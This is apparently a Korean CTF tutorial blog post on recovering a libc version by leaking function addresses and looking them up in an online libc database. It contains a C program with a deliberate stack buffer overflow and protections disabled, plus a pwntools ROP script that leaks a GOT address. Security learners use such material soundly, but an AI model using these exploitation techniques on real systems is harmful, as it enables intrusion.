## Introduction
ROP를 해야하는데 CTF에서 libc 파일을 주지 않았을 경우엔 주최측 서버의 libc 버전을 추측해야하는 상황이 생깁니다.

이 때, ASLR이 걸려도 하위 1.5바이트는 변하지 않음을 이용해 libc 버전을 알아낼 수 있습니다.

## libc-database search
파일로 된 libc-database도 있지만 이번 실습에 이용할 것은 [libc database search](https://libc.blukat.me)입니다.

![1](/image/libc-database/1.png)

쿼리문에 leak해서 얻어낸 함수와 주소를 입력하면, libc 버전과 유용한 offset들을 나타내줍니다.

## Practice
아래의 C 파일을 바탕으로 실습하도록 하겠습니다.

```C
// Compile: gcc -o libc-database libc-database.c -fno-PIE -no-pie -fno-stack-protector -z execstack
#include <stdio.h>
#include <unistd.h>

int main(){
        char buf[0x30];

        setvbuf(stdin, 0, _IONBF, 0);
        setvbuf(stdout, 0, _IONBF, 0);

        puts("[*] Leak libc version");
        printf("Buf: ");
        read(0, buf, 0x100);

        return 0;
}
```

매우 간단한 BOF 문제이며 아래의 payload를 통해서 2개의 함수 주소를 leak 해보겠습니다.

```python
from pwn import *

context.log_level = 'debug'

r = process("./libc-database")
e = ELF("./libc-database")

pop_rdi = 0x401283

# Leak puts(read)
payload = b"A" * 56
payload += p64(pop_rdi) + p64(e.got['puts']) + p64(e.plt['puts'])

r.sendafter(": ", payload)

print(hex(u64(r.recv(6) + b"\x00"*2)))
```

실행하면 아래와 같은 결과값을 얻을 수 있습니다.

```shell
[*] puts: 0x7f0872b3d5a0
[*] read: 0x7f4a1aa14130
```

위 payload에서는 귀찮음의 이유로 한 번에 하나의 주소만 leak하였지만 정확한 libc 버전을 얻기 위해서는 최소 2~3개의 데이터가 필요합니다. 

이렇게 나온 값들을 아까의 페이지에 삽입하게되면 아래 사진과 같이 libc 버전과 offset이 나오게됩니다.

![2](/image/libc-database/2.png)

실제로 사용한 libc-2.31.so가 찾아짐을 확인할 수 있습니다.

![3](/image/libc-database/3.png)

## Conclusion

* *__함수 주소 하위 1.5바이트는 변하지 않음을 이용해__* libc version을 예측할 수 있습니다.
* *__최대한 많은 함수의 주소값__*을 알아야 예측 범위를 좁힐 수 있습니다.

## Reference

* [libc-database 사용하기](https://s1m0hya.tistory.com/20)